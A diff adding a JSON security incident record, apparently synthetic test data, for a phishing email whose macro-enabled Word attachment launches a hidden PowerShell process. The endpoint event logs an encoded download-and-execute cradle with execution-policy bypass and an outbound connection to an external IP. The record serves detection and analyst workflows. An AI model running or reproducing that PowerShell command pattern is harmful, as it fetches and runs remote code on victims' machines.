@@ -1,0 +1,158 @@
+{
+  "incident_details": {
+    "id": "INC-9001",
+    "title": "Email with Suspicious Attachment Detected",
+    "summary": "User received an email containing a suspicious attachment. The attachment hash was later flagged by threat intelligence sources.",
+    "priority": "High",
+    "riskScore": 85,
+    "status": "New",
+    "alertCount": 1,
+    "averageAlertRiskScore": 85,
+    "created": 1753175182981,
+    "updated": 1753175482981,
+    "assignee": null,
+    "categories": [
+      "Malware",
+      "Phishing",
+      "Initial Access"
+    ]
+  },
+  "alerts": [
+    {
+      "id": "ALERT-9001",
+      "name": "Suspicious Email Attachment",
+      "type": "Email Threat",
+      "severity": "High",
+      "riskScore": 85,
+      "timestamp": 1753175182981,
+      "mitre": {
+        "tactic": "Initial Access",
+        "technique": "Phishing: Spearphishing Attachment",
+        "technique_id": "T1566.001"
+      },
+      "events": [
+        {
+          "event_id": "EVT-001",
+          "event_time": 1753175182981,
+          "device": {
+            "type": "mail_gateway",
+            "product": "RSA NetWitness",
+            "hostname": "NW-MAIL-GW01"
+          },
+          "email": {
+            "from": "\"IT Support\" <it-support@secure-rp-support.com>",
+            "to": "jolin_j@rp-soc.com",
+            "subject": "Urgent: Password Expiry Notice",
+            "message_id": "<20260722121622.9001@secure-rp-support.com>",
+            "sender_ip": "185.199.108.153",
+            "reply_to": "helpdesk@secure-rp-support.com",
+            "attachment_count": 1,
+            "attachments": [
+              {
+                "filename": "Password_Reset_Form.docm",
+                "filetype": "Microsoft Word Macro-Enabled Document",
+                "size": 238944,
+                "md5": "44d88612fea8a8f36de82e1278abb02f",
+                "sha1": "3395856ce81f2b7382dee72602f798b642f14140",
+                "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+              }
+            ],
+            "urls": [
+              "http://secure-rp-support.com/password-reset"
+            ]
+          },
+          "network": {
+            "source_ip": "185.199.108.153",
+            "source_port": 443,
+            "destination_ip": "10.100.10.7",
+            "destination_port": 25,
+            "protocol": "SMTP",
+            "direction": "inbound"
+          },
+          "user": {
+            "username": "jolin_j",
+            "email": "jolin_j@rp-soc.com",
+            "department": "Finance"
+          },
+          "host": {
+            "hostname": "RPSOCWSWin2",
+            "ip": "10.100.20.16",
+            "os": "Windows 10 Enterprise"
+          },
+          "meta": {
+            "event.category": "email",
+            "event.type": "attachment",
+            "threat.category": "phishing",
+            "threat.name": "Suspicious Macro Attachment",
+            "file.name": "Password_Reset_Form.docm",
+            "file.extension": "docm",
+            "file.hash.md5": "44d88612fea8a8f36de82e1278abb02f",
+            "file.hash.sha1": "3395856ce81f2b7382dee72602f798b642f14140",
+            "file.hash.sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+            "ip.src": "185.199.108.153",
+            "ip.dst": "10.100.10.7",
+            "alias.host": "RPSOCWSWin2",
+            "user.dst": "jolin_j",
+            "email.subject": "Urgent: Password Expiry Notice",
+            "email.src": "it-support@secure-rp-support.com",
+            "email.dst": "jolin_j@rp-soc.com"
+          }
+        },
+        {
+          "event_id": "EVT-002",
+          "event_time": 1753175282981,
+          "device": {
+            "type": "endpoint",
+            "product": "RSA NetWitness Endpoint",
+            "hostname": "RPSOCWSWin2"
+          },
+          "host": {
+            "hostname": "RPSOCWSWin2",
+            "ip": "10.100.20.16",
+            "os": "Windows 10 Enterprise"
+          },
+          "user": {
+            "username": "jolin_j",
+            "email": "jolin_j@rp-soc.com"
+          },
+          "process": {
+            "process_name": "WINWORD.EXE",
+            "process_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            "pid": 4820,
+            "parent_process_name": "OUTLOOK.EXE",
+            "parent_pid": 3168,
+            "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\jolin_j\\Downloads\\Password_Reset_Form.docm\""
+          },
+          "child_process": {
+            "process_name": "powershell.exe",
+            "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "pid": 5144,
+            "parent_process_name": "WINWORD.EXE",
+            "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+          },
+          "network": {
+            "source_ip": "10.100.20.16",
+            "source_port": 49821,
+            "destination_ip": "45.77.88.21",
+            "destination_port": 443,
+            "protocol": "HTTPS",
+            "direction": "outbound"
+          },
+          "meta": {
+            "event.category": "endpoint",
+            "event.type": "process_creation",
+            "threat.category": "malware_execution",
+            "process.name": "powershell.exe",
+            "process.parent.name": "WINWORD.EXE",
+            "process.command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+            "ip.src": "10.100.20.16",
+            "ip.dst": "45.77.88.21",
+            "tcp.dstport": 443,
+            "alias.host": "RPSOCWSWin2",
+            "user.src": "jolin_j"
+          }
+        }
+      ]
+    }
+  ]
+}
